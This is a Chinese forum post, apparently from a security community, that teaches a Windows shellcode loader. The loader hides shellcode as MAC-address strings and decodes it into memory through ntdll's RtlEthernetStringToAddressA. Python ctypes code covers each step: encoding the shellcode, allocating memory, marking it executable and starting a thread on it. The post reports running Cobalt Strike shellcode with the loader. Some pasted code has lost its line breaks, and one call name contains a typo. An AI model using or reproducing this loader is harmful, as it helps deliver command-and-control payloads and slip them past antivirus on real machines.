前言
==

前几天不是研究过uuid加载器吗，觉得这种加载方式很有意思，通过api函数将uuid转为二进制写入内存。

今就突发奇想有没有别的api函数有异曲同工之处，我就搁开发手册搜啊，搜to a binary搜了半天  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1c44fa6eab56262f29aef659372b96bb9101b5af.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1c44fa6eab56262f29aef659372b96bb9101b5af.png)

嘿还真找着了俩函数RtlEthernetStringToAddressA和RtlEthernetAddressToStringA

发现是操作MAC地址的，可以将mac字符串转换成二进制写入内存，所以就有了本文

MAC是啥
=====

MAC地址也叫物理地址、硬件地址，由网络设备制造商生产时烧录在网卡的EPROM一种闪存芯片，通常可以通过程序擦写。IP地址与MAC地址在计算机里都是以二进制表示的，IP地址是32位的，而MAC地址则是48位（6个字节）的 。

转换MAC
=====

### RtlEthernetAddressToStringA

该函数是ntdll.dll库的函数，可以把mac地址二进制格式转换为字符串表示

```php
\xFC\x48\x83\xE4\xF0\xE8 ====> FC-48-83-E4-F0-E8
```

<https://docs.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlethernetaddresstostringa>

函数原型：

```php
NTSYSAPI PSTR RtlEthernetAddressToStringA(
  const DL_EUI48 *Addr,
  PSTR           S
);
```

使用此函数可以将二进制转换为mac格式

注意6个字节转换一个mac值，\\x00是一个字节

当剩余字节数不满6个可添加\\x00补充字节数，必须将全部的shellcode全部转化为mac值

在转换之前，需要一块内存用来接收mac值

由于我们转换成mac后，6个字节变成了17个字节，所以需内存大小自己算一下

```php
shellcode = b'\xfc\x48\x83\xe4...'
macmem = ctypes.windll.kernel32.VirtualAlloc(0,len(shellcode)/6*17,0x3000,0x40)
```

然后每隔六个字节进行一次转换，此时内存地址递增17

```php
for i in range(len(shellcode)/6):
     bytes_a = shellcode[i*6:6+i*6]
     ctypes.windll.Ntdll.RtlEthernetAddressToStringA(bytes_a, macmem+i*17)
```

这时可以看看内存中的值，是否是mac字符串形式  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1421e2688f4f5308310a7624818a0b67ef3f120a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1421e2688f4f5308310a7624818a0b67ef3f120a.png)

```php
a = ctypes.string_at(macmem,len(shellcode)*3-1)
print(a)
```

转换成mac字符串后，可以进一步转换成列表，或者复制下来放在服务器远程加载

```php
list = []
for i in range(len(shellcode)/6):
    d = ctypes.string_at(macmem+i*17,17)
    list.append(d)
print(list)
```

MAC写入内存
=======

下面已经将shellcode转为了MAC，并放在列表中

```php
import ctypes

list = ['FC-48-83-E4-F0-E8', 'C8-00-00-00-41-51', '41-50-52-51-56-48', '31-D2-65-48-8B-52', '60-48-8B-52-18-48'......]
```

### RtlEthernetStringToAddressA

该函数是ntdll.dll库的函数，将MAC值从字符串形式转为二进制格式

```php
FC-48-83-E4-F0-E8 ====> \xFC\x48\x83\xE4\xF0\xE8
```

<https://docs.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlethernetstringtoaddressa>

函数原型

```php
NTSYSAPI NTSTATUS RtlEthernetStringToAddressA(  PCSTR    S,  PCSTR    *Terminator,  DL_EUI48 *Addr);
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4177415abcd808d419c7eafaf32c972acd19327b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4177415abcd808d419c7eafaf32c972acd19327b.png)

一二参数传入mac值，第三参数传入接收的内存指针

```php
ctypes.windll.Ntdll.RtlEthernetStringToAddressA(mac,mac, ptr)
```

申请内存，注意申请内存的大小len(list)\*6有多少mac值，它的6倍就是需要的内存大小

```php
ptr = ctypes.windll.kernel32.VirtualAlloc(0,len(list)*6,0x3000,0x04)
```

通过RtlEthernetStringToAddressA函数，将mac值转为二进制写入内存

rwxpage是内存指针，表示从该指针位置写入

rwxpage+=6是控制指针的位置，每写入一个mac二进制需要将指针移动6个字节

```php
rwxpage = ptrfor i in range(len(list)):    ctypes.windll.Ntdll.RtlEthernetStringToAddressA(list[i], list[i], rwxpage)    rwxpage += 6
```

然后创建线程运行即可

```php
ctypes.windll.kernel32.VirtualProtect(ptr, len(list)*6, 0x40, ctypes.byref(ctypes.c_long(1)))handle = ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)ctypes.windll.kernel32.WaitForSingleO bject(handle, -1)
```

测试
==

使用py2.7环境，CS生成的64位shellcode  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4cba543208adda654d8febf92b83e2b702652a3e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4cba543208adda654d8febf92b83e2b702652a3e.png)  
成功上线，免杀没有测试，主要是研究姿势